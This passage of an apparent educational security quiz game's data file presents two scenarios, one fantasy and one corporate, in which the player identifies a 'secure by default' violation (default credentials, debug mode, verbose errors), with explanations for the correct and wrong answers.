        - Error messages reveal the crystal's internal structure\n- All features are enabled, including\
        \ many the Council doesn't use\n\n\"But it works!\" the apprentice protests. \"Why should I change\
        \ the defaults if\neverything functions?\"\n\nWhat security principle was violated here?\n   \
        \             "
      choices:
      - text: Principle of least privilege - the apprentice has too much access
      - text: Secure by default - applications should ship in a hardened state
      - text: Defense in depth - there aren't enough security layers
      - text: Separation of duties - one person did everything
      success_text: "\n\"The principle violated is SECURE BY DEFAULT,\" you explain. \"Applications should\n\
        ship in a HARDENED state - minimal permissions, debugging disabled, strong\ncredentials required.\"\
        \n\nYou address each issue:\n\n\"DEFAULT CREDENTIALS: The vendor ships with 'admin123' so buyers\
        \ can access the\ndevice. But leaving this unchanged is a critical vulnerability. Secure systems\n\
        require CHANGING defaults immediately.\"\n\n\"DEBUG MODE: Helpful for development, dangerous in\
        \ production. Exposes internal\ndetails attackers can exploit. Should be OFF by default.\"\n\n\
        \"VERBOSE ERRORS: Stack traces help developers but also help attackers understand\nyour system.\
        \ Production should show user-friendly messages, not technical details.\"\n\n\"UNUSED FEATURES:\
        \ Each enabled feature is attack surface. If you don't need it,\ndisable it. Minimum necessary\
        \ functionality.\"\n\nThe apprentice asks, \"So I need to harden everything?\"\n\n\"Exactly. Never\
        \ assume defaults are secure. They're for convenience, not security.\"\n\nYou have identified\
        \ a SECURE BY DEFAULT violation.\n                "
      failure_texts:
        0: "\nLeast privilege concerns who has access to what. This issue is about HOW the\nsystem was\
          \ configured at deployment - default credentials, debug mode enabled,\nexcessive features. The\
          \ system was deployed in its insecure default state.\nThat's a secure-by-default issue.\n  \
          \                  "
        2: "\nDefense in depth is about multiple security layers. This issue is about the\nsystem's base\
          \ configuration - default passwords, debugging enabled, everything\nturned on. Even with multiple\
          \ layers, a system with default admin credentials\nis compromised. The configuration itself\
          \ needs hardening.\n                    "
        3: "\nSeparation of duties divides responsibilities among people. This issue is about\nthe system's\
          \ initial configuration being insecure. Even with proper duty\nseparation, deploying a system\
          \ with default credentials and debug mode violates\nsecure-by-default principles.\n        \
          \            "
    corporate:
      title: THE PRODUCTION DEPLOYMENT
      narrative: "\nA new web application was rushed to production. Security review reveals:\n\n- Admin\
        \ login: admin / admin (default credentials)\n- Debug mode: Enabled (full stack traces visible)\n\
        - Error pages: Show database connection strings\n- Features: Everything enabled, including unused\
        \ admin tools\n\n\"We'll harden it after launch,\" says the developer. \"Right now it just needs\n\
        to work.\"\n\nWhat security principle was violated by deploying with these defaults?\n       \
        \         "
      choices:
      - text: Principle of least privilege
      - text: Secure by default / Secure configuration
      - text: Defense in depth
      - text: Separation of duties
      success_text: "\n\"This violates SECURE BY DEFAULT,\" you explain. \"Applications should be deployed\n\
        in a hardened state, not 'we'll fix it later.'\"\n\nYou address the violations:\n\n\"DEFAULT CREDENTIALS:\
        \ admin/admin is scanned by automated attackers constantly.\nWithin hours of deployment, bots\
        \ will try these credentials. Require strong,\nunique passwords BEFORE deployment.\"\n\n\"DEBUG\
        \ MODE: Stack traces tell attackers exactly what frameworks you use, file\npaths, database queries\
        \ - everything needed to craft attacks. NEVER in production.\"\n\n\"VERBOSE ERRORS: Connection\
        \ strings in error messages? That's giving attackers\nyour database credentials. Production errors\
        \ should be generic.\"\n\n\"UNUSED FEATURES: Each enabled feature is attack surface. Admin tools\
        \ you don't\nuse? Disable them. Less attack surface means fewer ways in.\"\n\nThe developer asks,\
        \ \"But we need to launch quickly...\"\n\n\"An insecure launch is worse than a delayed launch.\
        \ 'We'll harden it later' usually\nmeans 'we'll harden it after the breach.'\"\n\nYou have identified\
        \ a SECURE BY DEFAULT violation.\n                "
      failure_texts:
        0: "\nLeast privilege concerns access permissions. This issue is about deploying\nwith insecure\
          \ default configuration - default passwords, debug mode, excessive\nfeatures. Even with proper\
          \ access controls, default credentials allow anyone in.\nThe configuration itself is the problem.\n\
          \                    "
        2: "\nDefense in depth is multiple security layers. This issue is about the base\nconfiguration\
          \ being insecure. Even with layers, an application with admin/admin\ncredentials is compromised.\
          \ You must fix the foundation (secure configuration)\nbefore layers matter.\n              \
          \      "
        3: "\nSeparation of duties divides responsibilities. This issue is about insecure\ndefaults at\
          \ deployment. Even with proper duty separation, the deployed system\nhas default credentials\
          \ and debug mode. The configuration needs hardening\nregardless of who does what.\n        \
          \            "
